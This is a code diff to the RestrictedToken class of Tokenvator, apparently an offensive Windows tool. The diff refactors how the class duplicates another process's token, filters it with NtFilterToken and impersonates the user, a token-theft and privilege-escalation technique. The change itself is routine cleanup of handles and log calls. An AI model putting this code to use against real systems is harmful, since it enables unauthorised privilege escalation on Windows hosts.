@@ -12,9 +12,11 @@ namespace Tokenvator
 {
     class RestrictedToken : Tokens
     {
+        IntPtr luaToken;
 
         internal RestrictedToken() : base(false)
         {
+            luaToken = new IntPtr();
             Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);
         }
 
@@ -46,7 +48,7 @@ namespace Tokenvator
         public Boolean GetPrimaryToken(UInt32 processId)
         {
             //Originally Set to true
-            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, true, processId);
+            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_LIMITED_INFORMATION, false, processId);
             if (hProcess == IntPtr.Zero)
             {
                 Console.WriteLine(" [-] Unable to Open Process Token: {0}", processId);
@@ -63,10 +65,11 @@ namespace Tokenvator
             Console.WriteLine(" [+] Primary Token Handle: {0}", hExistingToken.ToInt32());
             kernel32.CloseHandle(hProcess);
 
+            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
             if (!advapi32.DuplicateTokenEx(
                         hExistingToken,
                         (UInt32)(Constants.TOKEN_ALL_ACCESS),
-                        IntPtr.Zero,
+                        ref securityAttributes,
                         Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                         Enums.TOKEN_TYPE.TokenPrimary,
                         out phNewToken
@@ -77,6 +80,7 @@ namespace Tokenvator
             }
             Console.WriteLine(" [+] Existing Token Handle: {0}", hExistingToken.ToInt32());
             Console.WriteLine(" [+] New Token Handle: {0}", phNewToken.ToInt32());
+            kernel32.CloseHandle(hExistingToken);
             return true;
         }
 
@@ -94,7 +98,7 @@ namespace Tokenvator
                 return false;
             }
 
-            Console.WriteLine(" [+] Initialized SID : " + pSID.ToInt32());
+            Console.WriteLine(" [+] Initialized SID : {0}", pSID.ToInt32());
 
             Structs.SID_AND_ATTRIBUTES sidAndAttributes = new Structs.SID_AND_ATTRIBUTES();
             sidAndAttributes.Sid = pSID;
@@ -109,15 +113,15 @@ namespace Tokenvator
                 GetError("NtSetInformationToken: ");
                 return false;
             }
-            Console.WriteLine(" [+] Set Token Information : " + phNewToken.ToInt32());
+            Console.WriteLine(" [+] Set Token Information : {0}", phNewToken.ToInt32());
 
-            IntPtr luaToken = new IntPtr();
+            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
             if (0 != ntdll.NtFilterToken(phNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken))
             {
                 GetError("NtFilterToken: ");
                 return false;
             }
-            Console.WriteLine(" [+] Set LUA Token Information : " + luaToken.ToInt32());
+            Console.WriteLine(" [+] Set LUA Token Information : {0}", luaToken.ToInt32());
             return true;
         }
 
@@ -125,23 +129,20 @@ namespace Tokenvator
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean ImpersonateUser()
         {
-            IntPtr luaToken = new IntPtr();
-            UInt32 flags = 4;
-            ntdll.NtFilterToken(phNewToken, flags, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
-
+            Structs._SECURITY_ATTRIBUTES securityAttributes = new Structs._SECURITY_ATTRIBUTES();
             if (!advapi32.DuplicateTokenEx(
-                        phNewToken,
+                        luaToken,
                         (UInt32)(Constants.TOKEN_IMPERSONATE | Constants.TOKEN_QUERY),
-                        IntPtr.Zero,
+                        ref securityAttributes,
                         Enums._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
-                        Enums.TOKEN_TYPE.TokenPrimary,
-                        out luaToken
+                        Enums.TOKEN_TYPE.TokenImpersonation,
+                        out phNewToken
             ))
             {
                 GetError("DuplicateTokenEx: ");
                 return false;
             }
-            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
+            Console.WriteLine(" [+] Duplicate Token Handle : {0}", phNewToken.ToInt32());
             if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
